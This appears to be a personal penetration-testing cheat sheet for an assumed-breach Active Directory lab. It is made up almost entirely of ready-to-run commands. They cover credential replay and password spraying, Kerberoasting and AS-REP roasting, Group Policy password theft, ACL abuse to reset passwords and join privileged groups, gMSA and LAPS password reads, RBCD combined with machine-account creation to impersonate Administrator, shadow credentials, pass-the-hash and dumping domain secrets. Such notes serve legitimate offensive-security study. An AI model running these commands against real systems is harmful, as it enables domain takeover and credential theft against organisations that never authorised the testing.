## Assumed-breach workflow

Start condition:
- local admin on foothold: do `Starting host: establish local state` first, then immediate LDAP baseline before deep host PE
- only domain creds: do host-local checks only if you also have code exec
- both: do quick host-local checks first, then targeted replay and immediate LDAP baseline

Targeting rules:
- broad replay uses IPs
- LDAP manual checks use the DC FQDN or explicit `/etc/hosts` entry
- Kerberos-sensitive actions use FQDNs
- only switch bind formats during failure diagnosis
- password spraying happens only after you have the password policy and a user list
- Kali-side commands assume `DOMAIN`, `DC_IP`, `USER`, and `PASS` are already exported

## Starting host: establish local state

```powershell
whoami /all
hostname
ipconfig /all
route print
quser
qwinsta
```

If you already have local admin or SYSTEM, use [[Privilege Escalation/Windows Privilege Escalation]] for host-level looting and post-admin checks.

Record:
- current user, host, domain, routes
- user and machine flags
- saved credentials
- active sessions
- localhost-only services worth forwarding

## When to run the whole thing

Run the full workflow once:
- at the start of the AD set
- after you get a new credential type
  - new domain user
  - new local admin
  - new hash
  - new ticket
- after you gain access to a new network segment

## What to rerun after state changes

If you get a new domain credential:
- replay it on SMB, WinRM, LDAP, MSSQL, RDP
- rerun LDAP enum, group review, Kerberoast, AS-REP roast, share spidering, bloodyad writable checks

If you get local admin on a host:
- check logged-on users and sessions
- dump local creds, vaults, browser material, config files, scheduled tasks, services
- check localhost-only services and forward them if useful
- test any new creds or hashes everywhere they might work

## Workflow order

1. establish host position
2. sync time and add the DC/domain locally
3. replay each known credential on SMB, WinRM, LDAP, MSSQL, RDP
4. identify where you already have local admin
5. get password policy and a user list for any broad spray
6. do immediate LDAP baseline and targeted group review
7. spray candidate passwords only if the policy and user list support it
8. if you gain new host access, loot it, forward localhost-only services, and rerun replay plus LDAP/group/object checks

## Sync time with the domain controller

```bash
sudo ntpdate $DC_IP
```

## Add the domain and controller locally

```bash
echo "$DC_IP $DOMAIN dc.$DOMAIN" | sudo tee -a /etc/hosts
```

## Build a user list

```bash
nxc ldap $DC_IP -u "$USER" -p "$PASS" --active-users --users-export users.txt
```

Omit `--active-users` to see if any users are disabled. We shouldn't spray credentials against them, but these accounts are worth noting anyways.

Fallback:
```bash
nxc smb $DC_IP -u "$USER" -p "$PASS" --rid-brute | tee rid-brute.txt
```

## LDAP baseline enumeration
Rerun after new domain creds

```bash
ldapdomaindump -u "$DOMAIN\\$USER" -p "$PASS" -r -n $DC_IP "$DOMAIN" -o ldap_as_$USER
```

Helpful at a glance:
```
netexec ldap $DC_IP -u "$USER" -p "$PASS" --users --groups --computers --pass-pol
```

High-value groups:
- Domain Admins
- Enterprise Admins
- Administrators
- Account Operators
- Server Operators
- Backup Operators
- Remote Management Users
- Remote Desktop Users
- Distributed COM Users
- Group Policy Creator Owners

For a specific user, inspect recursive group membership:
```bash
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP get membership "<user>"
```

## Kerberoast with valid credentials

```bash
netexec ldap $DC_IP -u "$USER" -p "$PASS" --kerberoasting kerberoast.txt
```

## AS-REP roast with valid credentials

```bash
netexec ldap $DC_IP -u "$USER" -p "$PASS" --asreproast asrep.txt
```


### If LDAP bind or collection fails
1. sync time again
2. verify the creds against SMB on the DC
3. verify name resolution for the DC and domain
4. validate LDAP with [[389,636 LDAP(S)#Check who you are after an authenticated bind]]
5. keep enumerating manually even if BloodHound is broken

## Test SMB on all hosts

```bash
netexec smb hosts.txt -u "$USER" -p "$PASS" --shares
```

Use `-M spider_plus` on interesting shares.

## Pull Group Policy passwords

```bash
netexec smb $DC_IP -u "$USER" -p "$PASS" -M gpp_password
```

## Test WinRM on all hosts

```bash
netexec winrm hosts.txt -u "$USER" -p "$PASS"
```

## Test RDP on all hosts

```bash
netexec rdp hosts.txt -u "$USER" -p "$PASS"
```

## Test MSSQL on all hosts

```bash
netexec mssql hosts.txt -u "$USER" -p "$PASS"
```

## Test local admin reuse

```bash
netexec smb hosts.txt -u Administrator -p "$PASS" --local-auth
```

## Credential replay and spray

Targeted replay first:
- new domain user creds: replay immediately on SMB, WinRM, LDAP, MSSQL, RDP
- local admin creds: test `--local-auth` across hosts with the same local account name
- do not wait for a full user list before replaying a fresh credential you already have

Password spray only after policy and user-list collection:
```bash
netexec smb hosts.txt -u users.txt -p "$PASS" --continue-on-success
netexec winrm hosts.txt -u users.txt -p "$PASS" --continue-on-success
```

## Check writable AD objects

```bash
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP get writable --detail
```

## Check all Security Descriptors for user SIDs
```
rm -rf sd
mkdir -p sd

# Enumerate all users
bloodyad -H "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASS" get search \
  --filter '(&(objectCategory=person)(objectClass=user))' \
  --attr 'sAMAccountName,objectSid,distinguishedName' > users.txt

# SID-only patterns for rg
awk -F': ' '/^objectSid:/ {print $2}' users.txt | sort -u > sid.txt

# SID -> username -> DN reference
awk -F': ' '
/^distinguishedName:/ {
    if (dn != "" && sid != "")
        print sid "\t" user "\t" dn
    dn=$2
    sid=""
    user=""
}
/^sAMAccountName:/ {user=$2}
/^objectSid:/ {sid=$2}
END {
    if (dn != "" && sid != "")
        print sid "\t" user "\t" dn
}
' users.txt > sid-reference.txt

# Enumerate security descriptors / ACLs for all AD objects
bloodyad -H "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASS" get search \
  --filter '(objectClass=*)' \
  --attr 'distinguishedName,nTSecurityDescriptor' \
  --resolve-sd > sd/all.txt

# Find ACLs containing any user SID
rg -n -B 40 -A 5 --fixed-strings --file sid.txt sd/all.txt

# View SID -> user -> DN mapping when needed
column -t -s $'\t' sid-reference.txt
```

## Take ownership, grant rights, then reset password

```bash
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP set owner <target_user> "$USER"
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add genericAll <target_user> "$USER"
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP set password <target_user> '<NewPassword123!>'
```

## Take ownership, grant rights, then add yourself to group

```bash
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP set owner 'Group Name' "$USER"
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add genericAll 'Group Name' "$USER"
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add groupMember 'Group Name' "$USER"
```

## Add SPN to a controlled user, then Kerberoast

```bash
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add servicePrincipalName <controlled_user> "HTTP/fake.$DOMAIN"
impacket-GetUserSPNs "$DOMAIN"/'controlled_user':'ControlledPass123!' -dc-ip $DC_IP -request
```

## Run with domain creds only over the network

```cmd
runas /netonly /user:domain.local\user cmd
```

## Check remote sessions with NetExec

```bash
netexec smb hosts.txt -u "$USER" -p "$PASS" --sessions
netexec smb hosts.txt -u "$USER" -p "$PASS" --loggedon-users
```

## Check LAPS with NetExec

```bash
netexec ldap $DC_IP -u "$USER" -p "$PASS" -M laps
```

## Check gMSA passwords with NetExec

```bash
netexec ldap $DC_IP -u "$USER" -p "$PASS" -M gmsa
```

## Read gMSA password directly with BloodyAD

```bash
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP get object 'gmsa01$' --attr msDS-ManagedPassword
```

## Create a computer account if MAQ allows it

```bash
impacket-addcomputer -computer-name 'ATTACKBOX$' -computer-pass 'Passw0rd!' -dc-ip $DC_IP "$DOMAIN"/"$USER":"$PASS"
```

## Create a computer account with BloodyAD

```bash
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add computer ATTACKBOX 'Passw0rd!'
```

## Write RBCD on a target computer

```bash
impacket-rbcd -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write "$DOMAIN"/"$USER":"$PASS" -dc-ip $DC_IP
```

## Add RBCD with BloodyAD

```bash
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add rbcd 'TARGET$' 'ATTACKBOX$'
```

## Add shadow credentials

```bash
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP add shadowCredentials target_user
```

## Use MAQ plus RBCD to get a service ticket

```bash
impacket-addcomputer -computer-name 'ATTACKBOX$' -computer-pass 'Passw0rd!' -dc-ip $DC_IP "$DOMAIN"/"$USER":"$PASS"
impacket-rbcd -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write "$DOMAIN"/"$USER":"$PASS" -dc-ip $DC_IP
impacket-getST -spn "cifs/target.$DOMAIN" -impersonate Administrator "$DOMAIN"/'ATTACKBOX$':'Passw0rd!' -dc-ip $DC_IP
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass "$DOMAIN"/Administrator@"target.$DOMAIN"
```

## Use pass-the-hash with Impacket

```bash
impacket-psexec <domain>/<user>@<target> -hashes :<hash>
```

## Dump domain credentials as domain admin

```bash
impacket-secretsdump "$DOMAIN"/username:password@$DC_IP
```

## Use the AD template

Track:
- supplied creds
- new creds, hashes, tickets
- spray results
- local admin hosts
- logged-on privileged users
- readable shares and loot
- `kerberoast` / `asrep` results
- writable users, groups, `OUs`, `GPOs`, delegation
- next smallest abuse step

## Use the service docs when needed

- LDAP: [[389,636 LDAP(S)]]
- Kerberos: [[88 Kerberos]]
- SMB: [[139,445 SMB]]
- WinRM: [[5985, 5986 WinRM]]
- MSSQL: [[1433 MSSQL]]

## Use Windows post-exploitation after a foothold

[[Windows Privilege Escalation#Post-exploitation after admin or SYSTEM]]

## Rare fallback if the lab gives no creds

Only then care about:
- anonymous LDAP
- SMB/RPC null sessions
- `AS-REP` from guessed users
